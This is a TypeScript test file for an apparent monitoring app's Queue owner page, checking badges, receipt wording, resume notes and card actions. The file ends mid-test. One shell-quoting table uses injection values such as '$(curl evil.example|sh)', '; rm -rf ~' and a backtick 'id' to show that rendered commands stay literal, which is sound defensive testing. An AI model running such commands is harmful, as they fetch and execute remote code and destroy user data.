// Queue owner page: the nav slot, card precedence text, resume records and the card controls, read from the shipped
// queue.jsx through test/lib/render-screen.ts.
// "spec §N" in this file = the Queue desk design spec, clauded-docs 44063 (Atrium Monitor documents, outside the repo).
//
// Runner: npx tsx --test test/queue.owner-page.client.test.ts

import test, { describe } from "node:test";
import assert from "node:assert/strict";
import { randomUUID } from "node:crypto";
import vm from "node:vm";
import { fileURLToPath } from "node:url";
import { dirname, resolve } from "node:path";
import { imageUploadQuerySchema, messageBodySchema, ownerOrdersQuerySchema, replyBodySchema } from "../src/server/queue/schemas.js";
import { getImageFacts } from "../src/server/queue/image-format.js";
import { IMAGE_BYTES_MAX } from "../src/server/queue/images.js";
import { collectText, findNodes, loadScreenModule, renderScreen, type RenderedNode } from "./lib/render-screen.js";

const __dirname = dirname(fileURLToPath(import.meta.url));
const QUEUE_SRC = resolve(__dirname, "../public/src/screens/queue.jsx");
const UI_SRC = resolve(__dirname, "../public/src/ui.jsx");
const realUiModule = (await loadScreenModule(UI_SRC)) as { UI: Record<string, unknown>; React: { createElement: (t: unknown, p: unknown) => unknown } };
const realUi = realUiModule.UI;
const realUiReact = realUiModule.React;

// window.UI stub — components resolve to transparent host elements; helpers and constants stay real.
function uiStub(): unknown {
  return new Proxy(
    {},
    {
      get: (_target, name: string) =>
        !/^[A-Z][a-z]/.test(name) && name in realUi
          ? realUi[name]
          : Object.defineProperty((props: Record<string, unknown>) => ({ __element: true, type: "ui-atom", props: { ...props, atom: name } }), "name", {
              value: name,
            }),
      has: () => true,
    },
  );
}

type Component = (props: unknown) => unknown;
interface ScreenModule {
  React: { createElement: (t: unknown, p: unknown, ...children: unknown[]) => unknown };
  [name: string]: unknown;
}

const screen = (await loadScreenModule(QUEUE_SRC, {
  URLSearchParams,
  window: { UI: uiStub(), location: { hash: "#queue" }, history: { replaceState: () => undefined } },
})) as ScreenModule;
// vm-realm values → this realm's prototypes, so deepEqual compares content
const getPlain = <T>(value: T): T => (value === undefined ? value : JSON.parse(JSON.stringify(value)));
const call = <T>(name: string, ...args: unknown[]): T => getPlain((screen[name] as (...a: unknown[]) => T)(...args));
const render = (name: string, props: unknown): RenderedNode => renderScreen(screen.React.createElement(screen[name] as Component, props)) as RenderedNode;

const SESSION_ID = "6f1c2a9e-4b7d-4e21-9a3f-0c5d8e7b1a42";
const CLI_PATH = "/Volumes/tools/atrium/scripts/atrium-queue.sh";
const READY_RESUMES = { status: "ready", data: [], error: null, busy: false };

function buildSession(overrides: Record<string, unknown> = {}) {
  return {
    id: SESSION_ID,
    name: "glass-atrium",
    isNameRegistered: true,
    profileLabel: "work-dev",
    cwd: "/Users/owner/Desktop/git/glass-atrium",
    cwdTail: "git/glass-atrium",
    configDir: null,
    state: "exited",
    isWaiting: false,
    permissionHint: "default",
    marker: null,
    ...overrides,
  };
}

function buildItem(overrides: Record<string, unknown> = {}) {
  return {
    id: 41,
    kind: "decision",
    title: "Pick the migration order",
    body: "Two orders keep the shadow DB green.",
    linkedDocIds: [],
    options: [
      { code: "R1", label: "Schema first", pros: "one deploy", cons: "longer lock" },
      { code: "R2", label: "Data first", pros: "short lock", cons: "two deploys" },
    ],
    recommendedCode: "R2",
    isFreeTextAllowed: true,
    isApprovalClass: false,
    status: "open",
    queuePosition: 7,
    deferCount: 0,
    nextAttempt: 1,
    answer: { code: null, text: null },
    askedAt: "2026-11-10T06:12:43.518Z",
    answeredAt: null,
    deliveredAt: null,
    session: buildSession(),
    resumes: [],
    deviation: null,
    skipReason: null,
    canResend: false,
    ...overrides,
  };
}

function buildQueue(overrides: Record<string, unknown> = {}) {
  const calls: unknown[][] = [];
  const record = (name: string) => (...args: unknown[]) => calls.push([name, ...args]);
  return {
    calls,
    queue: {
      busy: { id: null, error: null },
      resumes: READY_RESUMES,
      readResumes: record("readResumes"),
      drafts: {},
      setDraft: record("setDraft"),
      later: record("later"),
      send: record("send"),
      answerItem: record("answerItem"),
      settle: record("settle"),
      selectRow: record("selectRow"),
      sessions: buildSessions(),
      orders: buildOrders({ focus: record("focusOrders") }),
      reload: record("reload"),
      back: record("back"),
      list: { status: "ready", data: { items: [], nextCursor: null }, newIds: [] },
      steps: { index: 0, count: 1, prevId: null, nextId: null },
      ...overrides,
    },
  };
}

// the queue with a loaded list, its bands and the first row selected, as useQueueStateQ hands it to the desk
function withList(queue: Record<string, unknown>, items: unknown[], nextCursor: number | null = null) {
  const groups = call<Array<{ rows: Array<{ id: number }> }>>("getGroupsQ", items);
  return { ...queue, list: { status: "ready", data: { items, nextCursor }, newIds: [] }, filter: { profile: "" }, setFilter: () => undefined, groups, sheet: getSheet(groups, ""), selectedId: groups[0]?.rows[0]?.id ?? null, status: "" };
}

const getSheet = (groups: unknown, hashId: string) => call<{ id: number | null }>("getSheetStateQ", groups, hashId, null);

// the sheet is its own card markup → one tree holds its head, body and foot
const renderSheet = (props: unknown): RenderedNode => render("ItemSheetQ", props);
const byClass = (tree: RenderedNode, name: string) => findNodes(tree, (node) => String(node.props?.className ?? "").split(" ").includes(name));

const buttonLabelled = (tree: RenderedNode, label: string) => findNodes(tree, (node) => node.type === "button" && collectText(node).trim() === label);

describe("queue nav slot", () => {
  const ready = (awaiting: number, deviations: number) => ({ status: "ready", data: { awaiting, deviations, oldestAgeSeconds: 120 } });
  const rows = [
    { name: "a count never read gives no slot, so no zero that was not loaded", countState: { status: "loading" }, expected: undefined },
    { name: "an unread count shows a question mark rather than a blank badge", countState: { status: "error" }, expected: ["?"] },
    { name: "nothing awaiting and nothing deviating gives no slot", countState: ready(0, 0), expected: undefined },
    { name: "a count with deviations shows the awaiting numeral alone", countState: ready(2, 1), expected: ["2"] },
    { name: "a count answer without numbers reads as unread", countState: { status: "ready", data: { rows: [] } }, expected: ["?"] },
  ];
  for (const row of rows) {
    test(row.name, () => {
      const slot = call<{ queue?: { badges: Array<{ badge: string; icon?: string }> } }>("getQueueNavBadge", row.countState);
      assert.deepEqual(slot.queue?.badges.map((badge) => badge.icon ?? badge.badge), row.expected);
    });
  }

  test("the deviation glyph rides the count only while a deviation is open", () => {
    const glyphOf = (deviations: number) =>
      call<{ queue: { badges: Array<{ glyph?: string; description: string }> } }>("getQueueNavBadge", ready(4, deviations)).queue.badges[0];
    assert.equal(glyphOf(0)?.glyph, undefined);
    assert.equal(glyphOf(2)?.glyph, (realUi.TONE_GLYPH as Record<string, string>).warn);
    assert.equal(glyphOf(2)?.description, "4 awaiting you, 2 deviations");
  });

  // a background tab shows what waits; a count of nothing, or one not read, adds nothing to the title
  const titleRows = [
    { name: "items awaiting lead the title with their count", countState: ready(7, 0), expected: "(7) Queue · Atrium Monitor" },
    { name: "nothing awaiting leaves the count out", countState: ready(0, 0), expected: "Queue · Atrium Monitor" },
    { name: "a count not read yet leaves the count out", countState: { status: "loading" }, expected: "Queue · Atrium Monitor" },
    { name: "a failed count read leaves the count out", countState: { status: "error", data: { awaiting: 3, deviations: 0 } }, expected: "Queue · Atrium Monitor" },
  ];
  for (const row of titleRows) {
    test(`document title: ${row.name}`, () => assert.equal(call("getQueueTitle", row.countState, "Atrium Monitor"), row.expected));
  }
});

describe("Later", () => {
  test("Later moves the item to the end and keeps the others in queue order", () => {
    const items = [buildItem({ id: 1 }), buildItem({ id: 2, kind: "report" }), buildItem({ id: 3 })];
    const ids = (list: Array<{ id: number }>) => list.map((item) => item.id);
    assert.deepEqual(ids(call("putLaterQ", items, 1)), [2, 3, 1]);
    assert.deepEqual(ids(call("putLaterQ", items, 2)), [1, 3, 2]);
  });

  const kinds = [
    { name: "a decision's sheet offers Answer later", kind: "decision", label: "Answer later" },
    { name: "a report's sheet offers Read later", kind: "report", label: "Read later" },
  ];
  for (const row of kinds) {
    test(row.name, () => {
      const { calls, queue } = buildQueue();
      const tree = renderSheet({ item: buildItem({ id: 9, kind: row.kind }), queue });
      const [later] = buttonLabelled(tree, row.label);
      assert.ok(later, "Later button rendered");
      (later.props.onClick as () => void)();
      assert.deepEqual(getPlain(calls), [["later", 9]]);
    });
  }
});

describe("after Send the next awaiting item is found in list order", () => {
  const items = [buildItem({ id: 1 }), buildItem({ id: 2, status: "answered" }), buildItem({ id: 3 }), buildItem({ id: 4 })];
  const rows = [
    { name: "skips a row no longer awaiting", id: 1, expected: 3 },
    { name: "wraps to the first awaiting row from the last", id: 4, expected: 1 },
    { name: "no other awaiting row leaves the focus where it is", id: 1, list: [buildItem({ id: 1 }), buildItem({ id: 2, status: "answered" })], expected: null },
  ];
  for (const row of rows) test(row.name, () => assert.equal(call("getNextAwaitingIdQ", row.list ?? items, row.id), row.expected));
});

test("after Send the next open item the active filter shows takes the sheet, in band order", async () => {
  const module = (await loadScreenModule(QUEUE_SRC, {
    window: { UI: uiStub() },
    fetch: async () => ({ status: 200, json: async () => ({ ok: true }) }),
  })) as ScreenModule;
  const personal = buildSession({ id: "9b2e7c41-0d3a-4c55-8e1f-2a6b9c4d7e10", profileLabel: "personal" });
  const items = [buildItem({ id: 1 }), buildItem({ id: 4, kind: "report" }), buildItem({ id: 2, session: personal }), buildItem({ id: 3 })];
  const opened: unknown[] = [];
  const actions = (module.useQueueActionsQ as (deps: unknown) => { answerItem: (id: number, body: unknown) => Promise<void> })({
    groups: call("getGroupsQ", call("getVisibleItemsQ", items, { profile: "work-dev" })),
    setList: () => undefined,
    setDrafts: () => undefined,
    setStatus: () => undefined,
    openItem: (id: unknown) => opened.push(["open", id]),
    closeSheet: () => opened.push(["close"]),
    reload: () => undefined,
  });
  await actions.answerItem(1, { code: "R1" });
  assert.deepEqual(getPlain(opened), [["open", 3]]);
});

test("a draft held in page state reappears when its item is selected again", () => {
  const { queue } = buildQueue({ drafts: { 41: { text: "keep the shadow DB" } } });
  const tree = renderSheet({ item: buildItem(), queue });
  const [field] = findNodes(tree, (node) => node.type === "textarea");
  assert.equal(field?.props.value, "keep the shadow DB");
});

// one word per recipient: received, not yet, or — only when the queue recorded it did not get there — not received
describe("receipt words", () => {
  // the facts render as a list of siblings → held in one host element, as the letterhead's slot holds them
  const factsText = (item: unknown) => collectText(renderScreen(screen.React.createElement("p", null, screen.React.createElement(screen.LetterheadFactsQ as Component, { item }))) as RenderedNode);
  const rows = [
    { name: "an acknowledged order is received", item: { status: "delivered", deliveredAt: "2026-11-12T12:28:04.311Z" }, word: "Received" },
    { name: "an answer waiting for its pull is not yet received", item: { status: "answered" }, word: "Not yet" },
    { name: "an order handed over and not acknowledged yet is not yet received", item: { status: "delivering" }, word: "Not yet" },
    { name: "a held order is not yet received", item: { status: "held", deviation: "held" }, word: "Not yet" },
    { name: "an order whose automatic resume is still to come is not yet received", item: { status: "resume_pending", deviation: "resume_pending" }, word: "Not yet" },
    { name: "an order its session never acknowledged is not received", item: { status: "unacked", deviation: "unacked", canResend: true }, word: "Not received" },
    { name: "an unacknowledged order is not received while its session is marked for a resume", item: { status: "unacked", deviation: "unacked" }, word: "Not received" },
    { name: "an expired order is not received", item: { status: "expired", deviation: "expired", canResend: true }, word: "Not received" },
    { name: "an order whose automatic resume is used is not received", item: { status: "resume_pending", deviation: "resume_pending", canResend: true }, word: "Not received" },
  ];
  for (const row of rows) {
    test(row.name, () => {
      const item = buildItem({ kind: "message", answeredAt: "2026-11-12T12:26:40.118Z", ...row.item });
      const text = factsText(item);
      assert.ok(text.includes(row.word) && !(row.word === "Not yet" && text.includes("received")), text);
    });
  }

  test("no surface names a deviation by its queue status", () => {
    const words = /Unacked|Held|Expired|Resume pending|Session not reachable|Delivery off/;
    for (const status of ["unacked", "held", "expired", "resume_pending"]) {
      const item = buildItem({ kind: "message", status, deviation: status, answeredAt: "2026-11-12T12:26:40.118Z" });
      const text = `${factsText(item)} ${collectText(render("CardStateQ", { item, cliPath: CLI_PATH }))}`;
      assert.doesNotMatch(text, words, text);
    }
  });

  const rollUps = [
    { name: "some copies received counts them", statuses: ["delivered", "answered", "delivering"], facts: ["1 of 3 received"] },
    { name: "every copy waiting reads not yet", statuses: ["answered", "delivering", "held"], facts: ["Not yet"] },
    { name: "a copy not received follows the count as its own warning", statuses: ["delivered", "unacked", "answered"], facts: ["1 of 3 received", "1 not received"] },
  ];
  for (const row of rollUps) {
    test(`an order to several sessions rolls up its receipts: ${row.name}`, () => {
      const copies = row.statuses.map((status, index) => buildItem({ id: 90 + index, kind: "message", status, sendId: "send-1", answeredAt: "2026-11-12T12:26:40.118Z" }));
      const facts = call<Array<{ text: string }>>("getRowFactsQ", { item: copies[0], copies }, false).map((fact) => fact.text);
      assert.deepEqual(facts, ["Order", ...row.facts]);
    });
  }
});

describe("sheet state lines", () => {

  // an answered item waits for its session's pull → the owner learns whether a wait takes it, else how to pull it
  const pullRows = [
    { name: "a live session that is waiting takes the answer at its next poll", status: "answered", session: { state: "live", isWaiting: true }, isWaitNamed: true, hasCommand: false },
    { name: "a live session that is not waiting shows the pull command", status: "answered", session: { state: "live", isWaiting: false }, isWaitNamed: false, hasCommand: true },
    { name: "an ended session is resumed, so neither line shows", status: "answered", session: { state: "exited", isWaiting: false }, isWaitNamed: false, hasCommand: false },
    { name: "an unanswered item has nothing to pull", status: "open", session: { state: "live", isWaiting: false }, isWaitNamed: false, hasCommand: false },
  ];
  for (const row of pullRows) {
    test(`pull line: ${row.name}`, () => {
      const text = collectText(render("CardStateQ", { item: buildItem({ status: row.status, session: buildSession(row.session) }), cliPath: CLI_PATH }));
      assert.equal(text.includes("The session is waiting"), row.isWaitNamed, text);
      assert.equal(text.includes(`${CLI_PATH} pending`), row.hasCommand, text);
    });
  }

  const ANSWERED_AT = "2026-11-12T04:05:17.482Z";
  const answered = (overrides: Record<string, unknown>) => buildItem({ status: "delivered", answeredAt: ANSWERED_AT, isAnsweredOutside: false, ...overrides });
  // the record names when, by which route and on which request signal, in the letterhead time's title; only an unrecorded answer is a visible, flagged line
  const answerRows = [
    { name: "an answer on fetch metadata", item: answered({ answerRecord: { route: "answer", signal: "fetch_metadata" } }), words: ["Answered", "same-origin request"], isFlagged: false },
    { name: "a reply on the Origin header alone", item: answered({ kind: "report", answerRecord: { route: "reply", signal: "origin" } }), words: ["Replied", "Origin header"], isFlagged: false },
    { name: "an owner message", item: answered({ answerRecord: { route: "message", signal: "fetch_metadata" } }), words: ["Sent as a message"], isFlagged: false },
    { name: "an answer from before the record", item: answered({ answerRecord: { route: "answer", signal: "before_record" } }), words: ["Answered", "before answers were recorded"], isFlagged: false },
    { name: "an answer with no record", item: answered({ answerRecord: null, isAnsweredOutside: true }), words: ["Answered outside the Queue page"], isFlagged: true },
  ];
  for (const row of answerRows) {
    test(`answer record line: ${row.name}`, () => {
      const tree = render("CardStateQ", { item: row.item });
      const [time] = findNodes(render("LetterheadTimeQ", { item: row.item }), (node) => typeof node.props?.title === "string");
      const text = row.isFlagged ? collectText(tree) : String(time?.props.title);
      for (const word of row.words) assert.ok(text.includes(word), text);
      assert.ok(text.includes("2026-11-12 13:05 KST"), text);
      assert.equal(findNodes(tree, (node) => /\btext-warn\b/.test(String(node.props?.className ?? ""))).length, row.isFlagged ? 1 : 0, text);
    });
  }

  test("an item with no answer carries no answer record line", () => {
    const text = collectText(render("CardStateQ", { item: buildItem({ answerRecord: null, isAnsweredOutside: false }) }));
    assert.doesNotMatch(text, /Answered|Replied|Sent as/);
  });

  test("an approval-class decision's note slot says to confirm once more in the session's terminal", () => {
    const text = (item: unknown) => collectText(render("SheetFootQ", { item, draft: {}, queue: buildQueue().queue, isBusy: false, error: null }));
    assert.match(text(buildItem({ isApprovalClass: true })), /Approval: after you answer here, confirm once more in glass-atrium's terminal\./);
    assert.doesNotMatch(text(buildItem()), /confirm once more/);
  });
});

describe("sheet precedence notes", () => {
  const occupant = { profileLabel: "personal", cwdTail: "wt/owner-queue", sessionIdPrefix: "9b2e7c41" };
  // a note's parts: a string is prose, { machine } renders through MachineString
  const markedLine = [
    "waiting on personal · wt/owner-queue · ",
    { machine: "9b2e7c41" },
    ", whose automatic resume has not registered: this one waits until that session registers " +
      "or is resumed in a terminal (see its card), and resumes automatically once that session has then ended",
  ];
  const generic = ["another session is live or resuming in this worktree: this one resumes automatically once that one has ended"];
  const capturedIdNote = [
    "the resumed session may still be running in the background: under profile work-dev, check it with ",
    { machine: "claude logs bg-7f3a" },
    ", and resume it yourself in a terminal only after ",
    { machine: "claude stop bg-7f3a" },
  ];
  const markedSession = (bgId: string | null, configDir: string | null = null) =>
    buildSession({ marker: { setAt: "2026-11-10T06:20:11.204Z", bgId }, configDir });
  const pending = (skipReason: unknown, extra: Record<string, unknown> = {}) => buildItem({ status: "resume_pending", skipReason, ...extra });
  const rows = [
    { name: "a used attempt asks for Resend", item: pending({ kind: "resume_used" }), expected: [["automatic resume used — Resend to try again"]] },
    { name: "an approval item needs the terminal", item: pending({ kind: "approval" }), expected: [["approval needs your terminal: resume the session yourself"]] },
    { name: "a resume in flight shows no text", item: pending({ kind: "in_flight" }), expected: [] },
    { name: "no marked occupant gives the generic worktree line", item: pending({ kind: "shared_worktree", markedOccupants: [], hasUnmarkedOccupant: true }), expected: [generic] },
    { name: "a marked occupant is named", item: pending({ kind: "shared_worktree", markedOccupants: [occupant], hasUnmarkedOccupant: false }), expected: [markedLine] },
    {
      name: "a marked and a live occupant give the marked line then the generic line",
      item: pending({ kind: "shared_worktree", markedOccupants: [occupant], hasUnmarkedOccupant: true }),
      expected: [markedLine, generic],
    },
    { name: "the captured-id marker form names the bg id and the profile", item: pending({ kind: "marker" }, { session: markedSession("bg-7f3a") }), expected: [capturedIdNote] },
    {
      name: "the listing marker form names the cwd and the full session id",
      item: pending({ kind: "marker" }, { session: markedSession(null) }),
      expected: [
        [
          "the resumed session may still be running in the background: under profile work-dev, check ",
          { machine: "claude agents --json --cwd /Users/owner/Desktop/git/glass-atrium" },
          " for the entry of session ",
          { machine: SESSION_ID },
          ", and resume it yourself in a terminal only once that entry is no longer listed, or after ",
          { machine: "claude stop <id>" },
          " with that entry's id",
        ],
      ],
    },
    {
      name: "the marker on an unacked card of a marked session replaces any skip text",
      item: buildItem({ status: "unacked", deviation: "unacked", session: markedSession("bg-7f3a") }),
      expected: [capturedIdNote],
    },
  ];
  for (const row of rows) test(row.name, () => assert.deepEqual(call("getCardNotesQ", row.item), row.expected));

  const configRows = [
    { name: "captured-id form carries the recorded config dir in each command", bgId: "bg-7f3a" },
    { name: "listing form carries the recorded config dir in each command", bgId: null },
  ];
  for (const row of configRows) {
    test(row.name, () => {
      const [note] = call<Array<Array<string | { machine: string }>>>("getCardNotesQ", buildItem({ session: markedSession(row.bgId, "/Users/owner/.claude-work-dev") }));
      const commands = (note ?? []).flatMap((part) => (typeof part === "string" || !part.machine.includes("claude ") ? [] : [part.machine]));
      assert.equal(commands.length, 2, String(commands));
      for (const command of commands) assert.ok(command.startsWith("CLAUDE_CONFIG_DIR=/Users/owner/.claude-work-dev claude "), command);
    });
  }

  // POSIX single-quote form: a value outside the plain-path set → one literal word, never expanded or split
  const shellWordRows = [
    { name: "a plain path stays bare", value: "/Users/owner/Desktop/git/glass-atrium", shellWord: "/Users/owner/Desktop/git/glass-atrium" },
    { name: "a space keeps the path one word", value: "/Users/owner/My Repos/app", shellWord: "'/Users/owner/My Repos/app'" },
    { name: "command substitution stays literal", value: "/tmp/x$(curl evil.example|sh)", shellWord: "'/tmp/x$(curl evil.example|sh)'" },
    { name: "a command separator stays literal", value: "/tmp/a; rm -rf ~", shellWord: "'/tmp/a; rm -rf ~'" },
    { name: "a backtick stays literal", value: "/tmp/`id`", shellWord: "'/tmp/`id`'" },
    { name: "an embedded single quote closes, escapes and reopens", value: "/tmp/it's", shellWord: "'/tmp/it'\\''s'" },
  ];
  for (const row of shellWordRows) {
    test(`every value a rendered command carries is shell-quoted: ${row.name}`, () => {
      const listing = call<Array<string | { machine: string }>[]>("getCardNotesQ", buildItem({ session: markedSession(null, row.value) }))[0] ?? [];
      const listed = buildItem({ session: { ...markedSession(null), cwd: row.value } });
      const [cwdCommand] = (call<Array<string | { machine: string }>[]>("getCardNotesQ", listed)[0] ?? []).flatMap((part) => (typeof part === "string" ? [] : [part.machine]));
      const captured = call<Array<string | { machine: string }>[]>("getCardNotesQ", buildItem({ session: markedSession(row.value) }))[0] ?? [];
      const pull = collectText(render("CardStateQ", { item: buildItem({ status: "answered", session: buildSession({ state: "live" }) }), cliPath: row.value }));
      assert.equal(cwdCommand, `claude agents --json --cwd ${row.shellWord}`);
      assert.ok(listing.some((part) => typeof part !== "string" && part.machine.startsWith(`CLAUDE_CONFIG_DIR=${row.shellWord} claude `)), JSON.stringify(listing));
      assert.ok(captured.some((part) => typeof part !== "string" && part.machine === `claude logs ${row.shellWord}`), JSON.stringify(captured));
      assert.ok(pull.includes(`${row.shellWord} pending`), pull);
    });
  }

  test("a note's commands and ids render through MachineString and its prose carries no backticks", () => {
    const tree = render("CardStateQ", { item: pending({ kind: "marker" }, { session: markedSession("bg-7f3a") }) });
    const machine = findNodes(tree, (node) => node.props.atom === "MachineString").map((node) => collectText(node));
    assert.deepEqual(machine, ["claude logs bg-7f3a", "claude stop bg-7f3a"]);
    assert.doesNotMatch(collectText(tree), /`/);
  });

  test("a marked session with a used attempt shows the marker reason and no Resend", () => {
    const item = pending({ kind: "marker" }, { session: markedSession("bg-7f3a"), canResend: false, resumes: [{ attempt: 1, sentAt: "2026-11-10T06:20:11.204Z", result: "sent", abortReason: null, bgId: "bg-7f3a" }] });
    const tree = renderSheet({ item, queue: buildQueue().queue });
    assert.match(collectText(tree), /claude logs bg-7f3a/);
    assert.equal(buttonLabelled(tree, "Resend answer").length, 0);
  });

  test("a used attempt in a shared worktree shows the used state with Resend answer", () => {
    const item = pending({ kind: "resume_used" }, { canResend: true });
    const { calls, queue } = buildQueue();
    const tree = renderSheet({ item, queue });
    assert.match(collectText(tree), /automatic resume used — Resend to try again/);
    const [resend] = buttonLabelled(tree, "Resend answer");
    (resend?.props.onClick as () => void)();
    assert.deepEqual(getPlain(calls), [["send", 41, "resend"]]);
  });
});

describe("automatic resume record", () => {
  const rows = [
    { name: "a spawn", resume: { result: "sent", abortReason: null }, expected: "spawned" },
    { name: "a failed spawn", resume: { result: "failed", abortReason: null }, expected: "failed" },
    { name: "an abort because the session came back", resume: { result: "aborted", abortReason: "session_returned" }, expected: "not spawned: session came back" },
    { name: "an abort for a shared worktree", resume: { result: "aborted", abortReason: "shared_worktree" }, expected: "not spawned: another session in this worktree" },
  ];
  for (const row of rows) test(`result label: ${row.name}`, () => assert.equal(call("getResumeResultLabelQ", row.resume), row.expected));

  test("each card resume shows its time, account and result", () => {
    const resume = { attempt: 2, sentAt: "2026-11-10T06:20:11.204Z", result: "aborted", abortReason: "session_returned", bgId: null };
    const text = collectText(renderSheet({ item: buildItem({ status: "resume_pending", resumes: [resume] }), queue: buildQueue().queue }));
    const line = text.split("Automatic resume ")[1] ?? "";
    assert.ok(line.startsWith((realUi.formatKstDateTime as (iso: string) => string)(resume.sentAt)), line);
    assert.match(line, /work-dev · attempt 2 · not spawned: session came back/);
  });

});

describe("recent automatic resumes", () => {
  const row = (itemId: number, title: string, attempt: number, result: string) => ({
    attempt,
    sentAt: "2026-11-10T06:40:00.870Z",
    result,
    abortReason: null,
    bgId: null,
    item: { id: itemId, title },
    session: { profileLabel: ".claude-work", cwdTail: "atrium/hooks" },
  });

  test("the record lists the server's resume rows in its order, each with account, worktree and item title", () => {
    const resumes = [row(9, "Pick the lock order", 2, "acked"), row(4, "Pick the index", 1, "sent")];
    const text = collectText(render("RecentResumesQ", { region: { ...READY_RESUMES, data: resumes }, onRead: () => undefined }));
    const lines = text.split("Automatic resume ").slice(1);
    assert.equal(lines.length, 2, text);
    assert.match(lines[0] ?? "", /\.claude-work · atrium\/hooks · attempt 2 · spawned · acknowledged\s+— Pick the lock order/);
    assert.match(lines[1] ?? "", /attempt 1 · spawned\s+— Pick the index/);
  });

  const views = [
    { name: "a failed read shows the shared region failure with Retry", region: { status: "error", data: null, error: "HTTP 503 database_unavailable", busy: false }, atom: "RegionUnavailable", isShown: true },
    { name: "an empty record shows nothing", region: READY_RESUMES, atom: "DetailSurface", isShown: false },
    { name: "a first read in flight shows nothing", region: { status: "loading", data: null, error: null, busy: true }, atom: "DetailSurface", isShown: false },
  ];
  for (const view of views) {
    test(view.name, () => {
      const tree = render("RecentResumesQ", { region: view.region, onRead: () => undefined });
      assert.equal(findNodes(tree, (node) => node.props?.atom === view.atom).length > 0, view.isShown);
    });
  }

  test("opening the drawer re-reads the record", () => {
    let reads = 0;
    const tree = render("RecentResumesQ", { region: { ...READY_RESUMES, data: [row(9, "Pick the lock order", 1, "acked")] }, onRead: () => { reads += 1; } });
    const [button] = buttonLabelled(tree, "Automatic resumes 1");
    (button?.props.onClick as () => void)();
    assert.equal(reads, 1);
  });

  // spec §4.4: the foot button's count and ⚠ follow the page's own tick, as the list does
  test("the page's tick reads the resume record beside the list, the sessions, the count and the thread", async () => {
    const reads: string[] = [];
    const read = (name: string, answer: unknown = undefined) => async () => { reads.push(name); return answer; };
    const isGood = await (screen.getPageReadQ as (deps: unknown) => Promise<boolean>)({
      readList: read("list", { isGood: true, arrived: [], turned: [] }),
      readResumes: read("resumes"),
      sessions: { read: read("sessions") },
      orders: { reread: read("thread") },
      onReadQueueCount: read("count"),
      setStatus: () => undefined,
    });
    assert.deepEqual([isGood, [...reads].sort()], [true, ["count", "list", "resumes", "sessions", "thread"]]);
  });

  test("the record is read from the resume route, whatever the owner list holds", async () => {
    const urls: string[] = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: realUi },
      fetch: async (url: string) => {
        urls.push(url);
        return { status: 200, json: async () => ({ resumes: [row(9, "Pick the lock order", 1, "acked")] }) };
      },
    })) as ScreenModule;
    let region: unknown = realUi.INITIAL_REGION_STATE;
    const setResumes = (next: (prev: unknown) => unknown) => { region = next(region); };
    await (module.getResumesQ as (deps: unknown) => Promise<void>)({ setResumes });
    assert.deepEqual(urls, ["/api/queue/owner/resumes"]);
    assert.deepEqual((getPlain(region) as { data: Array<{ item: { id: number } }> }).data.map((resume) => resume.item.id), [9]);
  });
});

describe("screen", () => {
  test("the Queue screen renders its header and a loading body before the first read", () => {
    const tree = render("ScreenQueue", {});
    const atoms = findNodes(tree, (node) => node.type === "ui-atom").map((node) => node.props.atom);
    assert.ok(atoms.includes("PageHeader"), String(atoms));
    assert.ok(atoms.includes("LoadingPlaceholder"), String(atoms));
  });

  // the list carries no delivery flag → a page alert here would read as a delivery outage that does not exist
  test("a loaded list renders the list alone at rest, one row per item under bands, and no sheet", () => {
    const items = [buildItem({ id: 1 }), buildItem({ id: 2, kind: "report", linkedDocIds: [43944] })];
    const queue = withList(buildQueue().queue, items);
    const pane = render("MiddlePaneQ", { queue });
    const [slot] = byClass(pane, "queue-list-slot");
    assert.deepEqual(findNodes(pane, (node) => node.props?.role === "option").map((node) => node.props.id), ["queue-row-1", "queue-row-2"]);
    assert.deepEqual(findNodes(pane, (node) => node.props?.className === "queue-band").map((node) => collectText(node)), ["Decisions 1", "Reports 1"]);
    assert.equal(findNodes(pane, (node) => node.props?.atom === "AlertCard").length, 0);
    assert.deepEqual([slot?.props.hidden, byClass(pane, "queue-sheet").length], [undefined, 0]);
  });

  test("an opened row puts the list away, still mounted, and its sheet takes the pane", () => {
    const items = [buildItem({ id: 1 }), buildItem({ id: 2, kind: "report", linkedDocIds: [43944] })];
    const listed = withList(buildQueue().queue, items);
    const pane = render("MiddlePaneQ", { queue: { ...listed, sheet: getSheet(listed.groups, "2"), selectedId: 2 } });
    const [slot] = byClass(pane, "queue-list-slot");
    const [link] = findNodes(pane, (node) => node.type === "a" && node.props.className === "prose-link");
    assert.deepEqual([slot?.props.hidden, findNodes(slot as RenderedNode, (node) => node.props?.role === "option").length], [true, 2]);
    assert.equal(link?.props.href, "#clauded-docs?doc=43944");
  });
});

describe("an owner action's answer", () => {
  const draft = { 41: { code: "R2", text: "keep the shadow DB" } };
  const run = async (status: number, body: unknown) => {
    const posts: Array<{ url: string; body: unknown }> = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      fetch: async (url: string, init: { body: string }) => {
        posts.push({ url, body: JSON.parse(init.body) });
        return { status, json: async () => body };
      },
    })) as ScreenModule;
    let drafts: Record<string, unknown> = { ...draft };
    let busy: unknown = null;
    const counts = { reload: 0 };
    const isDone = await (module.sendActionQ as (deps: unknown) => Promise<boolean>)({
      id: 41,
      action: "answer",
      body: { code: "R2", text: "keep the shadow DB" },
      setBusy: (next: unknown) => { busy = next; },
      setDrafts: (next: (prev: Record<string, unknown>) => Record<string, unknown>) => { drafts = next(drafts); },
      reload: () => { counts.reload += 1; },
    });
    return { isDone, drafts: getPlain(drafts), busy: getPlain(busy), posts: getPlain(posts), reloads: counts.reload };
  };

  test("a taken answer posts the card's body, clears its draft and re-reads the list", async () => {
    const result = await run(200, { ok: true });
    assert.deepEqual(result.posts, [{ url: "/api/queue/owner/items/41/answer", body: { code: "R2", text: "keep the shadow DB" } }]);
    assert.equal(result.isDone, true);
    assert.equal(result.drafts[41], undefined);
    assert.equal(result.reloads, 1);
  });

  const refusals = [
    {
      name: "a page-origin refusal keeps the draft and shows on the card",
      status: 403,
      body: { error: "forbidden" },
      error: { id: 41, message: "The monitor refused this action. Try again." },
    },
    {
      name: "a refusal keeps the draft and shows the reason on the card",
      status: 400,
      body: { error: "unknown_option", reason: "the code is not one of this item's options" },
      error: { id: 41, message: "Refused: the code is not one of this item's options." },
    },
  ];
  // spec §4.4: a refused act is followed by a read at once, so the refusal line is true when it is read
  for (const row of refusals) {
    test(`${row.name}, and re-reads the page at once`, async () => {
      const result = await run(row.status, row.body);
      assert.equal(result.isDone, false);
      assert.deepEqual(result.drafts, draft);
